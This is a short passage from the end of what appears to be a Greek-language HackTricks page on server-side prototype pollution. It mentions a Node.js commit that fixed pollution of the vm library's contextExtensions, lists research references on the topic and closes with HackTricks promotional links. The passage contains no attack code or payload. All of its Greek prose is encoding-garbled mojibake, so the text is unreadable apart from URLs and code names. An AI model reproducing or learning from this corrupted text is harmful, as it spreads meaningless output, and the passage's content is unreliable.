Î‘Ï€ÏŒ [**Î±Ï…Ï„Î®Î½ Ï„Î·Î½ Î±Î»Î»Î±Î³Î®**](https://github.com/nodejs/node/commit/0313102aaabb49f78156cadc1b3492eac3941dd9) Î· Ï€ÏÏ‰Ï„ÏŒÏ„Ï…Ï€Î· ÏÏÏ€Î±Î½ÏƒÎ· Ï„Î¿Ï… **`contextExtensions`** Î±Ï€ÏŒ Ï„Î· Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎ· vm Î­Ï‡ÎµÎ¹ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î´Î¹Î¿ÏÎ¸Ï‰Î¸ÎµÎ¯ ÎºÎ±Ï„Î¬ ÎºÎ¬Ï€Î¿Î¹Î¿Î½ Ï„ÏÏŒÏ€Î¿, Î¿ÏÎ¯Î¶Î¿Î½Ï„Î±Ï‚ Ï„Î¹Ï‚ ÎµÏ€Î¹Î»Î¿Î³Î­Ï‚ ÏƒÎµ **`kEmptyObject`** Î±Î½Ï„Î¯ Î³Î¹Î± **`{}`**.

### **Î†Î»Î»ÎµÏ‚ ÏƒÏ…ÏƒÎºÎµÏ…Î­Ï‚**

* [https://github.com/yuske/server-side-prototype-pollution](https://github.com/yuske/server-side-prototype-pollution)

## Î‘Î½Î±Ï†Î¿ÏÎ­Ï‚

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://blog.sonarsource.com/blitzjs-prototype-pollution/](https://blog.sonarsource.com/blitzjs-prototype-pollution/)
* [https://arxiv.org/pdf/2207.11171.pdf](https://arxiv.org/pdf/2207.11171.pdf)
* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)

<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ hacking ÏƒÏ„Î¿ AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Î³Î¹Î± Î½Î± Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾ÎµÏ„Îµ Ï„Î¿ HackTricks:

* Î•Î¬Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î´Î¹Î±Ï†Î·Î¼Î¹ÏƒÎ¼Î­Î½Î· ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF** ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î£Î§Î•Î”Î™Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ Î³Î¹Î± Ï„Î¿ hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
